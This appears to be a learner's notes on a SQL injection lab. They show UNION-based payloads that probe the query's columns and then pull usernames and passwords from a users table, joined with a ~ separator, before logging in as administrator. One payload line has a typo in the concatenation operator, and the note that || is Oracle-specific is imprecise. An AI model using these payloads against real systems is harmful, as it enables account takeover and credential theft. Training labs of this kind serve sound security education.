Suppose that a query only returns one single column- the goal of this lab is to find which columns accept string data

' UNION SELECT username || '~' || password FROM users--

' UNION SELECT 'username' | | 'password' FROM users--

' UNION SELECT NULL,'a',NULL--  returns error but
' UNION SELECT NULL,'a'--  returns success

so from the successful query I was able to determine that the second column does indeed expect text.

Taking from the example- we know that the second column accepts text so all we have left to do is concatenate accordingly:

category=Gifts' UNION SELECT NULL, username || '~' || password FROM users--
![[Pasted image 20211206152538.png]]

This gives us the username and password separated by a ~


this is a double pipe sequence which is string concatenation operator on oracle. The injected query concatenates together the values of the username and pw fields separated by the ~ char.

Then we can login as the administrator accordingly.

